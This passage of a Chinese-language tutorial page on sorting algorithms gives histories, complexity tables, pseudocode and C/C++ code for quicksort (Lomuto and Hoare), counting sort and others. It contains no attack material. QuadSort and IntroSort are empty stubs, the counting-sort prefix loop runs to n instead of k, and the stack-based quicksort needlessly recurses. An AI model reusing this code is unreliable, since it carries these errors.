<span class="keyword">switch</span> (t) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">MergeSort_t</span>(A, <span class="number">0</span>, n<span class="number">-1</span>, B); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">MergeSort_b</span>(A, B); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Quad排序"><a href="#Quad排序" class="headerlink" title="Quad排序"></a>Quad排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">QuadSort</td>
<td align="left">n</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">n</td>
<td align="left">yes</td>
<td align="left">合并</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="quadsort"><ul class="nav-tabs"><li class="tab active"><a href="#quadsort-1">Pseudo</a></li><li class="tab"><a href="#quadsort-2">C</a></li><li class="tab"><a href="#quadsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="quadsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">QuadSort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="quadsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuadSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="quadsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuadSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="分治类"><a href="#分治类" class="headerlink" title="分治类"></a>分治类</h2><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>1959年由英国计算机科学家<code>Tony Hoare</code>在<code>Moscow State University</code>作为访问学生时（25岁）开发。采用分治思想，每次从数据中选择一个支点元素<code>pivot</code>，以此为基准将数据分割为两个区域<code>L</code>和<code>R</code>并对剩余元素进行分区，使得<code>pivot</code>元素在分区后处于正确位置，对<code>L</code>和<code>R</code>区域重复上述过程直至所有分区只剩下一个元素时排序完成。</p>
<p>对于输入数据<code>A[n]</code>, 对应区间<code>A[p,r]</code>，<code>Hoare</code>排序步骤如下：</p>
<ol>
<li>选择中间元素（<code>n</code>为偶数时，偏左侧）作为支点元素<code>pivot</code>，将输入数据分割为左区域<code>L</code>和右区域<code>R</code>；</li>
<li>从头向尾寻找<code>&lt;pivot</code>的元素<code>A[i]</code>，从尾向头寻找<code>&gt;pivot</code>的元素<code>A[j]</code>，一旦<code>i&gt;=j</code>时，对<code>A[p,j]</code>和<code>A[j+1,r]</code>重复上述过程。</li>
</ol>
<p>1986年<code>Jon Bentley</code>在<code>“Programming pearls”</code>中推广了<code>Nico Lomuto</code>设计的更简单的<code>Partition</code>实现。</p>
<p>对于输入数据<code>A[n]</code>, 对应区间<code>A[p,r]</code>，<code>Lomuto</code>排序步骤如下：</p>
<ol>
<li>选择最后一个元素作为支点元素<code>pivot</code>，将输入数据分割为左区域<code>L</code>和右区域<code>R</code>；</li>
<li>将<code>A[p,r]</code>中所有小于支点元素<code>pivot</code>的元素依次排列在头部<code>A[p-&gt;i]</code>，然后将<code>pivot</code>元素交换至正确位置应为<code>A[i]</code>；</li>
<li>对左区域<code>L</code>，即<code>A[p-&gt;i-1]</code>和右区域<code>R</code>，即<code>A[i+1,r]</code>重复上述过程。</li>
</ol>
<p>快速排序通常是实践中<strong>最快的比较排序算法</strong>，之所以快，主要由于分组时机恰当且非常高效，其平均时间复杂度为$n\log n$，而且常数因子<code>n</code>往往非常小。但是它的最坏情况为$n^2$，因此与堆排序结合，可以对几乎所有输入都能达到$n\log n$的最坏运行时间。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">QuickSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$n^2$</td>
<td align="left">$\log n$</td>
<td align="left">no</td>
<td align="left">分治</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="quicksort"><ul class="nav-tabs"><li class="tab active"><a href="#quicksort-1">Pseudo-L</a></li><li class="tab"><a href="#quicksort-2">Pseudo-H</a></li><li class="tab"><a href="#quicksort-3">C</a></li><li class="tab"><a href="#quicksort-4">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="quicksort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Lomuto分区算法</span></span><br><span class="line">Partition(A[<span class="type">p</span>,<span class="type">r</span>])</span><br><span class="line">    <span class="comment"># 选择最后一个元素作为支点元素</span></span><br><span class="line">    pivot = A[<span class="type">r</span>]</span><br><span class="line">    <span class="comment"># 将所有小于支点元素的元素依次排列在头部</span></span><br><span class="line">    i = p</span><br><span class="line">    <span class="keyword">for</span> j = p to <span class="built_in">r</span></span><br><span class="line">        <span class="keyword">if</span> A[<span class="type">j</span>] &lt; pivot</span><br><span class="line">            swap(A[<span class="type">i</span>], A[<span class="type">j</span>])</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 将支点元素交换到正确位置</span></span><br><span class="line">    swap(A[<span class="type">i</span>], A[<span class="type">r</span>])</span><br><span class="line">    <span class="comment"># 返回支点元素位置</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"><span class="comment"># Lomuto递归实现</span></span><br><span class="line">QuickSort(A[<span class="type">p</span>,<span class="type">r</span>])</span><br><span class="line">    <span class="keyword">if</span> p &lt; <span class="built_in">r</span></span><br><span class="line">        <span class="comment"># 此算法在分区后pivot元素已经处于正确位置，且左侧均小于pivot，右侧均大于pivot</span></span><br><span class="line">        pivot = Partition(A, p, <span class="built_in">r</span>)</span><br><span class="line">        QuickSort(A, p, pivot<span class="literal">-1</span>)</span><br><span class="line">        QuickSort(A, pivot+<span class="number">1</span>, <span class="built_in">r</span>)</span><br><span class="line"><span class="comment"># Lomuto非递归实现</span></span><br><span class="line">QuickSort(A[<span class="type">p</span>,<span class="type">r</span>])</span><br><span class="line">    S: stack</span><br><span class="line">    S &lt;- p</span><br><span class="line">    S &lt;- <span class="built_in">r</span></span><br><span class="line">    <span class="keyword">while</span> S.NoEmpty </span><br><span class="line">        <span class="built_in">r</span> &lt;- S</span><br><span class="line">        p &lt;- S</span><br><span class="line">        <span class="keyword">if</span> p &lt; <span class="built_in">r</span></span><br><span class="line">            pivot = Partition(A, p, <span class="built_in">r</span>)</span><br><span class="line">            <span class="keyword">if</span> pivot &gt; p + <span class="number">1</span></span><br><span class="line">                S &lt;- p</span><br><span class="line">                S &lt;- pivot<span class="literal">-1</span></span><br><span class="line">            <span class="keyword">if</span> pivot &lt; <span class="built_in">r</span> - <span class="number">1</span></span><br><span class="line">                S &lt;- pivot+<span class="number">1</span></span><br><span class="line">                S &lt;- <span class="built_in">r</span></span><br><span class="line">QuickSort(A[<span class="type">n</span>])</span><br><span class="line">    QuickSort(A, <span class="number">1</span>, n)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="quicksort-2"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hoare分区算法</span></span><br><span class="line">Partition(A[<span class="type">p</span>,<span class="type">r</span>])</span><br><span class="line">    <span class="comment"># 选择支点元素，floor舍弃余数使得:</span></span><br><span class="line">    <span class="comment"># 当元素个数为奇数时，支点元素即中间元素；</span></span><br><span class="line">    <span class="comment"># 当元素个数为偶数时，支点元素偏左侧些。</span></span><br><span class="line">    <span class="comment"># 例如A=&#123;3,4&#125;时，pivot为3；A=&#123;4,3&#125;时，pivot为4。</span></span><br><span class="line">    pivot = A[<span class="type">floor</span>((<span class="type">p</span>+<span class="type">r</span>)/<span class="number">2</span>)]</span><br><span class="line">    i = p - <span class="number">1</span></span><br><span class="line">    j = <span class="built_in">r</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> true</span><br><span class="line">        <span class="comment"># 从左向右寻找下一个不小于支点元素的元素</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> A[<span class="type">i</span>] &lt; pivot</span><br><span class="line">        <span class="comment"># 从右向左寻找下一个不大于支点元素的元素</span></span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">            j = j - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> A[<span class="type">j</span>] &gt; pivot</span><br><span class="line">        <span class="comment"># 一旦左右寻找范围交叉即停止</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= j</span><br><span class="line">            <span class="comment"># 此时pivot元素位置无法确定，可能在A[i]、A[j]或者其他位置；</span></span><br><span class="line">            <span class="comment"># 元素被划分了两半，一半不大于pivot，另一半相反，分割位置只能用j的右侧表示（i的左侧不能表示）；</span></span><br><span class="line">            <span class="comment"># 例如A=&#123;3,4&#125;时，A[i]=A[j]=3；A=&#123;4,3&#125;时，A[i]=4而A[j]=3。</span></span><br><span class="line">            <span class="comment"># （由于pivot偏左侧，因此无论A=&#123;3,4&#125;还是A=&#123;4,3&#125;，都不可能出现A[i]=A[j]=4的情况）</span></span><br><span class="line">            <span class="keyword">return</span> j</span><br><span class="line">        <span class="comment"># 交换寻找到的元素，使得小元素在左侧，大元素在右侧</span></span><br><span class="line">        swap(A[<span class="type">i</span>], A[<span class="type">j</span>])</span><br><span class="line"><span class="comment"># Hoare递归实现</span></span><br><span class="line">QuickSort(A[<span class="type">p</span>,<span class="type">r</span>])</span><br><span class="line">    <span class="keyword">if</span> p &lt; <span class="built_in">r</span></span><br><span class="line">        <span class="comment"># 此算法在分区后只能区分两半元素的分割位置，pivot元素不一定处于正确位置</span></span><br><span class="line">        pivot = Partition(A, p, <span class="built_in">r</span>)</span><br><span class="line">        QuickSort(A, p, pivot)</span><br><span class="line">        QuickSort(A, pivot+<span class="number">1</span>, <span class="built_in">r</span>)</span><br><span class="line"><span class="comment"># Hoare非递归实现</span></span><br><span class="line">QuickSort(A[<span class="type">p</span>,<span class="type">r</span>])</span><br><span class="line">    S: stack</span><br><span class="line">    S &lt;- p</span><br><span class="line">    S &lt;- <span class="built_in">r</span></span><br><span class="line">    <span class="keyword">while</span> S.NoEmpty </span><br><span class="line">        <span class="built_in">r</span> &lt;- S</span><br><span class="line">        p &lt;- S</span><br><span class="line">        <span class="keyword">if</span> p &lt; <span class="built_in">r</span></span><br><span class="line">            pivot = Partition(A, p, <span class="built_in">r</span>)</span><br><span class="line">            <span class="keyword">if</span> pivot &gt; p + <span class="number">1</span></span><br><span class="line">                S &lt;- p</span><br><span class="line">                S &lt;- pivot</span><br><span class="line">            <span class="keyword">if</span> pivot &lt; <span class="built_in">r</span> - <span class="number">1</span></span><br><span class="line">                S &lt;- pivot+<span class="number">1</span></span><br><span class="line">                S &lt;- <span class="built_in">r</span></span><br><span class="line">QuickSort(A[<span class="type">n</span>])</span><br><span class="line">    QuickSort(A, <span class="number">1</span>, n)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="quicksort-3"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Partition_l</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> p, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pivot, i, j, tmp;</span><br><span class="line">    pivot = A[r];</span><br><span class="line">    i = p;</span><br><span class="line">    <span class="keyword">for</span> (j = p; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[j] &lt; pivot) &#123;</span><br><span class="line">            tmp = A[i];</span><br><span class="line">            A[i] = A[j];</span><br><span class="line">            A[j] = tmp;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = A[i];</span><br><span class="line">    A[i] = A[r];</span><br><span class="line">    A[r] = tmp;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort_lr</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> p, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pivot;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        pivot = Partition_l(A, p, r);</span><br><span class="line">        QuickSort_lr(A, p, pivot<span class="number">-1</span>);</span><br><span class="line">        QuickSort_lr(A, pivot+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Partition_h</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> p, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="type">int</span> q, pivot, i, j, tmp;</span><br><span class="line">    q = (<span class="type">int</span>)<span class="built_in">floor</span>((p+r)/<span class="number">2</span>);</span><br><span class="line">    pivot = A[q];</span><br><span class="line">    i = p - <span class="number">1</span>;</span><br><span class="line">    j = r + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[i] &lt; pivot);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[j] &gt; pivot);</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= j)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        tmp = A[i];</span><br><span class="line">        A[i] = A[j];</span><br><span class="line">        A[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort_hr</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> p, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pivot;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        pivot = Partition_h(A, p, r);</span><br><span class="line">        QuickSort_hr(A, p, pivot);</span><br><span class="line">        QuickSort_hr(A, pivot+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == t) &#123;</span><br><span class="line">        QuickSort_lr(A, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        QuickSort_hr(A, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="quicksort-4"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Partition_l</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> pivot = A[r];</span><br><span class="line">    <span class="type">int</span> i = p;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = p; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[j] &lt; pivot) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(A[i], A[j]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">swap</span>(A[i], A[r]);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort_lr</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> pivot = <span class="built_in">Partition_l</span>(A, p, r);</span><br><span class="line">        <span class="built_in">QuickSort_lr</span>(A, p, pivot<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">QuickSort_lr</span>(A, pivot+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort_ls</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; S;</span><br><span class="line">    S.<span class="built_in">push</span>(p);</span><br><span class="line">    S.<span class="built_in">push</span>(r);</span><br><span class="line">    <span class="keyword">while</span> (!S.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        r = S.<span class="built_in">top</span>();</span><br><span class="line">        S.<span class="built_in">pop</span>();</span><br><span class="line">        p = S.<span class="built_in">top</span>();</span><br><span class="line">        S.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">            <span class="type">int</span> pivot = <span class="built_in">Partition_l</span>(A, p, r);</span><br><span class="line">            <span class="keyword">if</span> (pivot<span class="number">-1</span> &gt; p) &#123;</span><br><span class="line">                <span class="built_in">QuickSort_ls</span>(A, p, pivot<span class="number">-1</span>);</span><br><span class="line">                S.<span class="built_in">push</span>(p);</span><br><span class="line">                S.<span class="built_in">push</span>(pivot<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pivot+<span class="number">1</span> &lt; r) &#123;</span><br><span class="line">                <span class="built_in">QuickSort_ls</span>(A, pivot+<span class="number">1</span>, r);</span><br><span class="line">                S.<span class="built_in">push</span>(pivot+<span class="number">1</span>);</span><br><span class="line">                S.<span class="built_in">push</span>(r);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Partition_h</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> q = (<span class="type">int</span>)<span class="built_in">floor</span>((p+r)/<span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> pivot = A[q];</span><br><span class="line">    <span class="type">int</span> i = p - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> j = r + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[i] &lt; pivot);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[j] &gt; pivot);</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= j)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">swap</span>(A[i], A[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort_hr</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> p, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> pivot = <span class="built_in">Partition_h</span>(A, p, r);</span><br><span class="line">        <span class="built_in">QuickSort_hr</span>(A, p, pivot);</span><br><span class="line">        <span class="built_in">QuickSort_hr</span>(A, pivot+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">QuickSort_lr</span>(A, <span class="number">0</span>, n<span class="number">-1</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">QuickSort_ls</span>(A, <span class="number">0</span>, n<span class="number">-1</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">QuickSort_hr</span>(A, <span class="number">0</span>, n<span class="number">-1</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="混合类"><a href="#混合类" class="headerlink" title="混合类"></a>混合类</h2><h3 id="内省排序"><a href="#内省排序" class="headerlink" title="内省排序"></a>内省排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">IntroSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$\log n$</td>
<td align="left">no</td>
<td align="left">分治与选择</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="introsort"><ul class="nav-tabs"><li class="tab active"><a href="#introsort-1">Pseudo</a></li><li class="tab"><a href="#introsort-2">C</a></li><li class="tab"><a href="#introsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="introsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">IntroSort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="introsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">IntroSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="introsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IntroSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="非比较类"><a href="#非比较类" class="headerlink" title="非比较类"></a>非比较类</h1><p>比较类算法的最坏时间复杂度至少为$nlogn$，而非比较类算法不受此限制。</p>
<h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><p>1954年<code>Harold H. Seward</code>发明了计数排序并应用到基数排序中。<br>计数排序是<strong>一种正整数排序算法</strong>，它是<strong>稳定</strong>的，常被用作<a href="#%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F"><strong>基数排序</strong></a>算法的一个子过程。</p>
<p>计数排序假设输入数据<code>A[n]</code>中的元素都是在<code>[0,k]</code>区间内的一个正整数：</p>
<ol>
<li>在输入数据<code>A[n]</code>中查找最大元素<code>k</code>，并创建计数存储数组<code>C[k]</code>，各元素初始计数为<code>0</code>；</li>
<li>统计输入数据<code>A[n]</code>中各元素出现的次数，结果保存到<code>C[k]</code>；</li>
<li>将出现次数累加，使<code>C[e]</code>中值为小于或等于<code>e</code>元素的个数，即<code>C[e]</code>为最后出现的<code>e</code>元素的有序位置；</li>
<li>根据<code>C[k]</code>中的计数，从<code>A[n]</code>尾部开始遍历，得到有序的数据<code>B[n]</code>。</li>
</ol>
<p>当<code>k</code>值越小、<code>n</code>越大时，计数排序的性能越好。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">$n&lt;&lt;2^k$</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CountingSort</td>
<td align="left">-</td>
<td align="left">n+r</td>
<td align="left">n+r</td>
<td align="left">n+r</td>
<td align="left">yes</td>
<td align="left">yes</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="countingsort"><ul class="nav-tabs"><li class="tab active"><a href="#countingsort-1">Pseudo</a></li><li class="tab"><a href="#countingsort-2">C</a></li><li class="tab"><a href="#countingsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="countingsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">CountingSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 统计各元素小于或等于其自身的元素的个数</span></span><br><span class="line">    k: max(A[<span class="number">1</span>], A[<span class="number">2</span>], ... A[<span class="type">n</span>])</span><br><span class="line">    C[<span class="type">k</span>]: array[<span class="type">value</span>=<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n</span><br><span class="line">        C[<span class="type">A</span>[<span class="type">i</span>]]++</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">2</span> to n</span><br><span class="line">        C[<span class="type">i</span>] += C[<span class="type">i</span>-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 从尾到头遍历A，根据统计的计数得到有序数据B</span></span><br><span class="line">    B[<span class="type">n</span>]: array</span><br><span class="line">    <span class="keyword">for</span> i = n to <span class="number">1</span></span><br><span class="line">        B[<span class="type">C</span>[<span class="type">A</span>[<span class="type">i</span>]]] = A[<span class="type">i</span>]</span><br><span class="line">        C[<span class="type">A</span>[<span class="type">i</span>]]<span class="literal">--</span></span><br><span class="line">    <span class="comment"># 将有序数据B更新回原始数据A</span></span><br><span class="line">    A[<span class="type">n</span>] = B[<span class="type">n</span>]</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="countingsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CountingSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *B;</span><br><span class="line">    <span class="type">unsigned</span> *C;</span><br><span class="line">    <span class="type">int</span> i, k;</span><br><span class="line">    k = A[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; A[i])</span><br><span class="line">            k = A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    C = (<span class="type">unsigned</span>*)<span class="built_in">malloc</span>((k+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="type">unsigned</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= k; i++)</span><br><span class="line">        C[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        C[A[i]]++;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= k; i++)</span><br><span class="line">        C[i] += C[i<span class="number">-1</span>];</span><br><span class="line">    B = 